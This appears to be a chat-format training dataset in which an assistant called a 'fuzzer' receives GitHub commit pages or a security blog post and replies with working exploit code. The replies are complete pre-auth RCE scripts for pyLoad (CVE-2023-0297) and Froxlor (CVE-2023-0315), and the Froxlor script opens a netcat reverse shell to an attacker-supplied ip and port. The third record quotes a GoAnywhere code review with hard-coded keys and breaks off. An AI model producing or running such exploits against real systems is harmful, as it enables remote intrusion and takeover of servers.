{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d\nfix arbitrary python code execution by abusing js2py functionality · pyload/pyload@7d73ba7 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pyload\n \n/\n\npyload\n\nPublic\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    702\n \n          Star\n 3.2k\n  \nCode\n\nIssues\n175\nPull requests\n29\nDiscussions\n\nActions\n\nWiki\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Wiki\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fix arbitrary python code execution by abusing js2py functionality\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \nGammaC0de\n    \n  committed\n  Jan 3, 2023\n\n        1 parent\n          \n          6aa71cd\n\ncommit 7d73ba7\n\n      Showing\n      1 changed file\n      with\n      1 addition\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            3 changes: 1 addition & 2 deletions\n          \n3 \n\nsrc/pyload/core/utils/misc.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\n@@ -1,12 +1,11 @@\n\n# -*- coding: utf-8 -*-\n\nimport random\n\nimport socket\n\nimport string\n\nimport js2py\n\nfrom .check import is_mapping\n\njs2py.disable_pyimport()\n\ndef random_string(length):\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 7d73ba7\n\n \n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCode Injection in GitHub repository pyload/pyload prior to 0.5.0b3.dev31.\n\nexploit\n/python/webapps/51532.py\n# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)\n# Date: 06-10-2023\n# Credits: bAu @bauh0lz\n# Exploit Author: Gabriel Lima (0xGabe)\n# Vendor Homepage: https://pyload.net/\n# Software Link: https://github.com/pyload/pyload\n# Version: 0.5.0\n# Tested on: Ubuntu 20.04.6\n# CVE: CVE-2023-0297\n\nimport requests, argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('-u', action='store', dest='url', required=True, help='Target url.')\nparser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.')\narguments = parser.parse_args()\n\ndef doRequest(url):\n    try:\n        res = requests.get(url + '/flash/addcrypted2')\n        if res.status_code == 200:\n            return True\n        else:\n            return False\n\n    except requests.exceptions.RequestException as e:\n        print(\"[!] Maybe the host is offline :\", e)\n        exit()\n\ndef runExploit(url, cmd):\n    endpoint = url + '/flash/addcrypted2'\n    if \" \" in cmd:\n        validCommand = cmd.replace(\" \", \"%20\")\n    else:\n        validCommand = cmd\n\n    payload = 'jk=pyimport%20os;os.system(\"'+validCommand+'\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'\n    test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload)\n    print('[+] The exploit has be executeded in target machine. ')\n\ndef main(targetUrl, Command):\n    print('[+] Check if target host is alive: ' + targetUrl)\n    alive = doRequest(targetUrl)\n    if alive == True:\n        print(\"[+] Host up, let's exploit! \")\n        runExploit(targetUrl,Command)\n    else:\n        print('[-] Host down! ')\n\nif(arguments.url != None and arguments.cmd != None):\n    targetUrl = arguments.url\n    Command = arguments.cmd\n    main(targetUrl, Command)\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/froxlor/froxlor/commit/090cfc26f2722ac3036cc7fd1861955bc36f065a\nset file-log (if enabled) to be in froxlor/logs/ folder; fix ssl para… · froxlor/Froxlor@090cfc2 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        froxlor\n \n/\n\nFroxlor\n\nPublic\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    457\n \n          Star\n 1.6k\n  \nCode\n\nIssues\n36\nPull requests\n1\nActions\n\nProjects\n3\nWiki\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Wiki\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          set file-log (if enabled) to be in froxlor/logs/ folder; fix ssl para…\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\n…m directive for dovecot in Ubuntu Bionic; set version to 2.0.8\n\nSigned-off-by: Michael Kaufmann <d00p@froxlor.org>\n\nLoading branch information\n\n \nd00p\n    \n  committed\n  Jan 14, 2023\n        1 parent\n          \n          529890b\n\ncommit 090cfc2\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      7 changed files\n      with\n      34 additions\n      and\n      12 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        install\n      \n\ninstall/froxlor.sql.php\n\n        froxlor.sql.php\n      \n        updates/froxlor\n      \n\ninstall/updates/froxlor/update_2.x.inc.php\n\n        update_2.x.inc.php\n      \n        lib\n      \n\n        Froxlor\n      \n\nlib/Froxlor/Froxlor.php\n\n        Froxlor.php\n      \nlib/Froxlor/FroxlorLogger.php\n\n        FroxlorLogger.php\n      \n        configfiles\n      \n\nlib/configfiles/bionic.xml\n\n        bionic.xml\n      \n        lng\n      \n\nlng/de.lng.php\n\n        de.lng.php\n      \nlng/en.lng.php\n\n        en.lng.php\n      \n\n \n        There are no files selected for viewing\n\n \n\n            4 changes: 2 additions & 2 deletions\n          \n4 \n\ninstall/froxlor.sql.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -696,7 +696,7 @@\n\n\t('system', 'distribution', ''),\n\n\t('system', 'update_channel', 'stable'),\n\n\t('system', 'updatecheck_data', ''),\n\n\t('system', 'update_notify_last', '2.0.7'),\n\n\t('system', 'update_notify_last', '2.0.8'),\n\n\t('system', 'traffictool', 'goaccess'),\n\n\t('api', 'enabled', '0'),\n\n\t('2fa', 'enabled', '1'),\nExpand Down\n\nExpand Up\n\n@@ -740,7 +740,7 @@\n\n\t('panel', 'logo_overridetheme', '0'),\n\n\t('panel', 'logo_overridecustom', '0'),\n\n\t('panel', 'settings_mode', '0'),\n\n\t('panel', 'version', '2.0.7'),\n\n\t('panel', 'version', '2.0.8'),\n\n\t('panel', 'db_version', '202301120');\nExpand Down\n            14 changes: 14 additions & 0 deletions\n          \n14 \n\ninstall/updates/froxlor/update_2.x.inc.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -330,3 +330,17 @@\n\n Froxlor::updateToDbVersion('202301120');\n\n}\n\nif (Froxlor::isFroxlorVersion('2.0.7')) {\n\n Update::showUpdateStep(\"Updating from 2.0.7 to 2.0.8\", false);\n\n // adjust file-logging to be set to froxlor/logs/\n\n $logtypes = explode(',', Settings::Get('logger.logtypes'));\n\n if (in_array('file', $logtypes)) {\n\n Update::showUpdateStep(\"Adjusting froxlor logfile for system-logging to be stored in logs/froxlor.log\");\n\n Settings::Set('logger.logfile', 'froxlor.log');\n\n Update::lastStepStatus(0);\n\n\t}\n\n Froxlor::updateToVersion('2.0.8');\n\n}\n            2 changes: 1 addition & 1 deletion\n          \n2 \n\nlib/Froxlor/Froxlor.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -31,7 +31,7 @@ final class Froxlor\n\n{\n\n // Main version variable\n\n const VERSION = '2.0.7';\n\n const VERSION = '2.0.8';\n\n // Database version (YYYYMMDDC where C is a daily counter)\n\n const DBVERSION = '202301120';\nExpand Down\n            10 changes: 8 additions & 2 deletions\n          \n10 \n\nlib/Froxlor/FroxlorLogger.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -100,11 +100,17 @@ protected function __construct($userinfo = [])\n\n self::$ml->pushHandler(new SyslogHandler('froxlor', LOG_USER, Logger::DEBUG));\n\n break;\n\n case 'file':\n\n $logger_logfile = Settings::Get('logger.logfile');\n\n $logger_logfile = FileDir::makeCorrectFile(Froxlor::getInstallDir() . '/logs/' . Settings::Get('logger.logfile'));\n\n // is_writable needs an existing file to check if it's actually writable\n\n\t\t\t\t\t\t@touch($logger_logfile);\n\n if (empty($logger_logfile) || !is_writable($logger_logfile)) {\n\n Settings::Set('logger.logfile', '/tmp/froxlor.log');\n\n Settings::Set('logger.logfile', 'froxlor.log');\n\n $logger_logfile = FileDir::makeCorrectFile(Froxlor::getInstallDir() . '/logs/froxlor.log');\n\n\t\t\t\t\t\t\t@touch($logger_logfile);\n\n if (empty($logger_logfile) || !is_writable($logger_logfile)) {\n\n // not writable in our own directory? Skip\n\n break;\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n self::$ml->pushHandler(new StreamHandler($logger_logfile, Logger::DEBUG));\n\n break;\nExpand Down\n            6 changes: 1 addition & 5 deletions\n          \n6 \n\nlib/configfiles/bionic.xml\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -3458,11 +3458,7 @@ ssl_key = <<SSL_KEY_FILE>\n\n# auth_ssl_username_from_cert=yes.\n\n#ssl_cert_username_field = commonName\n\n# SSL DH parameters\n\n# Generate new params with `openssl dhparam -out /etc/dovecot/dh.pem 4096`\n\n# Or migrate from old ssl-parameters.dat file with the command dovecot\n\n# gives on startup when ssl_dh is unset.\n\nssl_dh = </usr/share/dovecot/dh.pem\n\nssl_dh_parameters_length = 2048\n\n# SSL protocols to use\n\n#ssl_protocols = !SSLv3\nExpand Down\n            5 changes: 4 additions & 1 deletion\n          \n5 \n\nlng/de.lng.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -1494,7 +1494,10 @@\n\n 'title' => 'Log-Art(en)',\n\n 'description' => 'Wählen Sie hier die gewünschten Logtypen. Für Mehrfachauswahl, halten Sie während der Auswahl STRG gedrückt<br />Mögliche Logtypen sind: syslog, file, mysql',\n\n\t\t\t],\n\n 'logfile' => 'Log-Datei Pfad inklusive Dateinamen',\n\n 'logfile' => [\n\n 'title' => 'Dateiname der Logdatei',\n\n 'description' => 'Wird nur verwendet, wenn die Log-Art \"file\" ausgewählt ist. Diese Datei wird unter froxlor/logs/ geschrieben. Dieser Ordner ist vor Webzugriff geschützt.',\n\n\t\t\t],\n\n 'logcron' => 'Logge Cronjobs',\n\n 'logcronoption' => [\n\n 'never' => 'Nie',\nExpand Down\n            5 changes: 4 additions & 1 deletion\n          \n5 \n\nlng/en.lng.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -1613,7 +1613,10 @@\n\n 'title' => 'Log-type(s)',\n\n 'description' => 'Specify logtypes. To select multiple types, hold down CTRL while selecting.<br />Available logtypes are: syslog, file, mysql',\n\n\t\t\t],\n\n 'logfile' => 'Logfile path including filename',\n\n 'logfile' => [\n\n 'title' => 'Filename for log',\n\n 'description' => 'Only used if log-type includes \"file\". This file will be created in froxlor/logs/. This folder is protected against public access.',\n\n\t\t\t],\n\n 'logcron' => 'Log cronjobs',\n\n 'logcronoption' => [\n\n 'never' => 'Never',\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 090cfc2\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCommand Injection in GitHub repository froxlor/froxlor prior to 2.0.8.\n\nexploit\n/php/webapps/51263.py\n#!/usr/bin/python3\n\n# Exploit Title: Froxlor 2.0.3 Stable - Remote Code Execution (RCE)\n# Date: 2023-01-08\n# Exploit Author: Askar (@mohammadaskar2)\n# CVE: CVE-2023-0315\n# Vendor Homepage: https://froxlor.org/\n# Version: v2.0.3\n# Tested on: Ubuntu 20.04 / PHP 8.2\n\nimport telnetlib\nimport requests\nimport socket\nimport sys\nimport warnings\nimport random\nimport string\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import quote\nfrom threading import Thread\n\nwarnings.filterwarnings(\"ignore\", category=3DUserWarning, module=3D'bs4')\n\n\nif len(sys.argv) !=3D 6:\n    print(\"[~] Usage : ./froxlor-rce.py url username password ip port\")\n    exit()\n\nurl =3D sys.argv[1]\nusername =3D sys.argv[2]\npassword =3D sys.argv[3]\nip =3D sys.argv[4]\nport =3D sys.argv[5]\n\nrequest =3D requests.session()\n\ndef login():\n    login_info =3D {\n    \"loginname\": username,\n    \"password\": password,\n    \"send\": \"send\",\n    \"dologin\": \"\"\n    }\n    login_request =3D request.post(url+\"/index.php\", login_info, allow_redi=\nrects=3DFalse)\n    login_headers =3D login_request.headers\n    location_header =3D login_headers[\"Location\"]\n    if location_header =3D=3D \"admin_index.php\":\n        return True\n    else:\n        return False\n\n\ndef change_log_path():\n    change_log_path_url =3D url + \"/admin_settings.php?page=3Doverview&part=\n=3Dlogging\"\n    csrf_token_req =3D request.get(change_log_path_url)\n    csrf_token_req_response =3D csrf_token_req.text\n    soup =3D BeautifulSoup(csrf_token_req_response, \"lxml\")\n    csrf_token =3D (soup.find(\"meta\",  {\"name\":\"csrf-token\"})[\"content\"])\n    print(\"[+] Main CSRF token retrieved %s\" % csrf_token)\n\n    multipart_data =3D {\n\n        \"logger_enabled\": (None, \"0\"),\n        \"logger_enabled\": (None, \"1\"),\n        \"logger_severity\": (None, \"2\"),\n        \"logger_logtypes[]\": (None, \"file\"),\n        \"logger_logfile\": (None, \"/var/www/html/froxlor/templates/Froxlor/f=\nooter.html.twig\"),\n        \"logger_log_cron\": (None, \"0\"),\n        \"csrf_token\": (None, csrf_token),\n        \"page\": (None, \"overview\"),\n        \"action\": (None, \"\"),\n        \"send\": (None, \"send\")\n   =20\n    }\n    req =3D request.post(change_log_path_url, files=3Dmultipart_data)\n    response =3D req.text\n    if \"The settings have been successfully saved.\" in response:\n        print(\"[+] Changed log file path!\")\n        return True\n    else:\n        return False\n\n\ndef inject_template():\n    admin_page_path =3D url + \"/admin_index.php\"\n    csrf_token_req =3D request.get(admin_page_path)\n    csrf_token_req_response =3D csrf_token_req.text\n    soup =3D BeautifulSoup(csrf_token_req_response, \"lxml\")\n    csrf_token =3D (soup.find(\"meta\",  {\"name\":\"csrf-token\"})[\"content\"])\n    onliner =3D \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} =\n{1} >/tmp/f\".format(ip, port)\n    payload =3D \"{{['%s']|filter('exec')}}\" % onliner\n    data =3D {\n        \"theme\": payload,\n        \"csrf_token\": csrf_token,\n        \"page\": \"change_theme\",\n        \"send\": \"send\",\n        \"dosave\": \"\",\n    }\n    req =3D request.post(admin_page_path, data, allow_redirects=3DFalse)\n    try:\n        location_header =3D req.headers[\"Location\"]\n        if location_header =3D=3D \"admin_index.php\":\n            print(\"[+] Injected the payload sucessfully!\")\n    except:\n        print(\"[-] Can't Inject payload :/\")\n        exit()\n    handler_thread =3D Thread(target=3Dconnection_handler, args=3D(port,))\n    handler_thread.start()\n    print(\"[+] Triggering the payload ...\")\n    req2 =3D request.get(admin_page_path)\n\n\ndef connection_handler(port):\n    print(\"[+] Listener started on port %s\" % port)\n    t =3D telnetlib.Telnet()\n    s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((\"0.0.0.0\", int(port)))\n    s.listen(1)\n    conn, addr =3D s.accept()\n    print(\"[+] Connection received from %s\" % addr[0])\n    t.sock =3D conn\n    print(\"[+] Heads up, incoming shell!!\")\n    t.interact()\n\n\n\nif login():\n    print(\"[+] Successfully Logged in!\")\n    index_url =3D url + \"/admin_index.php\"\n    request.get(index_url)\n    if change_log_path():\n        inject_template()\n\nelse:\n    print(\"[-] Can't login\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html\n\nGoAnywhere MFT - A Forgotten Bug | Frycos Security Diary\nFrycos Security Diary\nAbout\nGoAnywhere MFT - A Forgotten Bug\n\nFeb 6, 2023\n      \nDéjà-vu\nIt all began with a toot by Brian Krebs on 2nd February, 2023, providing information on an “On Prem Notification/Technical BulletinFeb 1, 2023”. This advisory was only accessible by registered users, describing a upcoming threat originated from an 0day affecting the file transfer solution product GoAnywhere MFT. Nice, because I remembered looking at parts of it years ago: 2021 too be more precise. During my first steps of security code review on GoAnywhere then, I got interested in a clustering message exchange library JGroups and did some research showing insecure deserialization effects. A “JGroups PoC project” of this work can be found in my GitHub repository.\nWell then, looking at the GoAnywhere security advisory again, there were some temporary mitigations listed. One should modify the web descriptor file [install_dir]/adminroot/WEB_INF/web.xml and delete a certain Servlet definition with its corresponding URL mapping: <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>. Wait a minute: I checked my notes from 2021 and found this.\n\nIndeed, back in 2021 I already made some notes on a dangerous sink which will become relevant in the blog post. FTAPI mentioned in the snippet above had an insecure deserialization bug prior to version 4.6.3 in a LicenseController class, leading to Remote Code Execution (RCE). This to me was the same kind of bug in GoAnywhere MFT but it was the administration console: I couldn’t find many instances on the Internet in 2021. What I didn’t know: JGroups. So I focused on that and forgot about the other things in my notes…until today (2nd February, 2022).\nI could provide a working PoC (compare hash and time of my tweet) to my teammates within hours on the same day to protect our clients first. But now let’s go the Code Review part.\nCode Review\nIn my case, I chose the Windows installation to get the latest version 7.1.1 at that time. It doesn’t really matter which operating system since it’s all based on Java. The installation location: C:\\Program Files\\HelpSystems\\GoAnywhere. The web.xml from the security advisory in the adminroot directory indeed contained the Servlet definition and URL mapping.\n<servlet>\n    \t\t\n    <servlet-name>License Response Servlet</servlet-name>\n    \t\t\n    <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>\n    \t\t\n    <load-on-startup>0</load-on-startup>\n    \t\n</servlet>\n\t\n<servlet-mapping>\n    \t\t\n    <servlet-name>License Response Servlet</servlet-name>\n    \t\t\n    <url-pattern>/lic/accept</url-pattern>\n    \t\n</servlet-mapping>\n\nLet’s dive into the code. The com.linoma.ga.ui.admin.servlet.LicenseResponseServlet extends HttpServlet as expected. Requests are processed by different standard methods such as com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(HttpServletRequest, HttpServletResponse) in our case.\npublic void doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException {\n  String str1 = paramHttpServletRequest.getParameter(\"bundle\"); // [1]\n  \n  Response response = null;\n  \n  try {\n    response = LicenseAPI.getResponse(str1); // [2]\n  } catch (Exception exception) {\n    LOGGER.error(\"Error parsing license response\", exception);\n    paramHttpServletResponse.sendError(500);\n  } \n  \n  paramHttpServletRequest.getSession().setAttribute(\"LicenseResponse\", response);\n\t// ...\n\nAt [1] the request parameter bundle is stored in the String str1 and put into the method call at [2]. Fromcom.linoma.license.gen2.LicenseAPI.getResponse(String) we follow further into com.linoma.license.gen2.LicenseController.getResponse(String).\nprotected static Response getResponse(String paramString) throws BundleException, JAXBException {\n  String str1 = getVersion(paramString); // [3]\n  String str2 = BundleWorker.unbundle(paramString, getProductKeyConfig(str1));\n  return (Response)inflate(str2, Response.class);\n}\n\nFirst, we step into the method definition at [3] getVersion in the same class.\nprotected static String getVersion(String paramString) {\n  int i = paramString.indexOf('$');\n  if (i > -1) {\n    null = paramString.substring(i + 1);\n    null = null.replace(\"\\r\", \"\");\n    return null.replace(\"\\n\", \"\");\n  } \n  \n  return \"1\";\n}\n\nThis seems to be a version differentiation of some kind based on the fact if our bundle parameter contains a $ character or not. Let’s say “no” (we can change our assumptions later any time if needed). 1 will be returned then.\nBack to our caller and the next code line leads us to another method BundleWorker.unbundle(paramString, getProductKeyConfig(str1)). getProductKeyConfig looks like this:\nprivate static KeyConfig getProductKeyConfig(String paramString) throws BundleException {\n  KeyConfig keyConfig = new KeyConfig();\n  inputStream = null;\n  try {\n    String str = \"\";\n    if (\"2\".equals(paramString)) { // [4]\n      str = \"1\";\n    }\n    \n    inputStream = LicenseController.class.getResourceAsStream(\"linomagen2.bcks\");\n    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n    IOUtils.copy(inputStream, byteArrayOutputStream);\n    keyConfig.setKeyStore(byteArrayOutputStream.toByteArray());\n    \n    keyConfig.setSigningAlias(\"productkey\" + str);\n    keyConfig.setVerifyingAlias(\"serverkey\" + str);\n    keyConfig.setPassword(\"G@mft2018\".toCharArray()); // [5]\n    keyConfig.setVersion(paramString);\n    keyConfig.setKeyStoreType(\"BCFKS\");\n    return keyConfig;\n\t  // ...\n\nNothing too interesting here: [4] makes again some version differentiation stuff and at [5] hard-coded passwords are defined for a key-store. Does GoAnywhere like hard-coded keys? Let’s keep this in mind.\nNow we enter something familiar (see my note in the introductory chapter): com.linoma.license.gen2.BundleWorker.unbundle(String, KeyConfig).\nprotected static String unbundle(String paramString, KeyConfig paramKeyConfig) throws BundleException {\n  try {\n    if (!\"1\".equals(paramKeyConfig.getVersion())) {\n      paramString = paramString.substring(0, paramString.indexOf(\"$\"));\n    }\n    \n    byte[] arrayOfByte = decode(paramString.getBytes(StandardCharsets.UTF_8)); // [6]\n\n    \n    arrayOfByte = decrypt(arrayOfByte, paramKeyConfig.getVersion()); // [7]\n\n    \n    arrayOfByte = verify(arrayOfByte, paramKeyConfig); // [8]\n\n    \n    return new String(decompress(arrayOfByte), StandardCharsets.UTF_8);\n\t  // ...\n\nThe method at [6] performs a Base64 decoding step. At [7] the byte array should be decrypted. How does decrypt look like?\nWe land in com.linoma.license.gen2.LicenseEncryptor.decrypt(byte[], String).\npublic byte[] decrypt(byte[] paramArrayOfByte, String paramString) throws CryptoException {\n  if (!this.initialized) {\n    throw new IllegalStateException(\"The License Encryptor has not been initialized\");\n  }\n  if (\"1\".equals(paramString)) {\n    if (this.encryptor == null) {\n      throw new CryptoException(\"License Encryptor version 1 not available in FIPS mode.\");\n    }\n    return this.encryptor.decryptToBytes(paramArrayOfByte); // [9]\n  } \n  return this.encryptorV2.decryptToBytes(paramArrayOfByte);\n}\n\nRemember the version differentiator? Since we control this, the decryption routine at [9] will be called (in case your not FIPS addicted).\nFinally, in com.linoma.security.core.crypto.StandardEncryptionEngine.decrypt(byte[]), a decryptionCipher.doFinal(paramArrayOfByte) call decrypts the byte array. But as you might know, also in Java Crypto API one has to initialize the Crypto engine properly, same for thecom.linoma.security.core.crypto.StandardEncryptionEngine.decryptionCipher class member. Using Eclipse’s “Call hierarchy” shortcut gives us the following tree, hitting the method com.linoma.license.gen2.LicenseEncryptor.initialize(boolean).\n\npublic void initialize(boolean paramBoolean) throws Exception {\n  if (!paramBoolean) {\n    this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, \"AES\", \"AES/CBC/PKCS5Padding\")); // [10]\n  }\n  this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, \"AES\", \"AES/CBC/PKCS5Padding\"));\n  this.initialized = true;\n}\n\nAt [10], the Cipher parameters are set. What about this initialization vector? \nprivate static final byte[] IV = { \n65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100 };\nlooks pretty “static”, alright. What about the secret key? Let’s look into com.linoma.license.gen2.LicenseEncryptor.getInitializationValue().\nprivate byte[] getInitializationValue() throws Exception {\n  byte[] arrayOfByte1 = { 103, 111, 64, 110, 121, 119, 104, 101, 114, 101, 76, 105, 99, 101, 110, 115, 101, 80, 64, 36, 36, 119, 114, 100 };\n\n  \n  byte[] arrayOfByte2 = { -19, 45, -32, -73, 65, 123, -7, 85 };\n  char c1 = '┿';\n  char c2 = 'Ā';\n  \n  SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\n  PBEKeySpec pBEKeySpec = new PBEKeySpec((new String(arrayOfByte1, \"UTF-8\")).toCharArray(), arrayOfByte2, c1, c2);\n  SecretKey secretKey = secretKeyFactory.generateSecret(pBEKeySpec);\n  return secretKey.getEncoded();\n}\n\nThe code speaks for itself. Hard-code all the things!\nOk, back to com.linoma.license.gen2.BundleWorker.unbundle(String, KeyConfig). Now, we’re probably able to provide a request 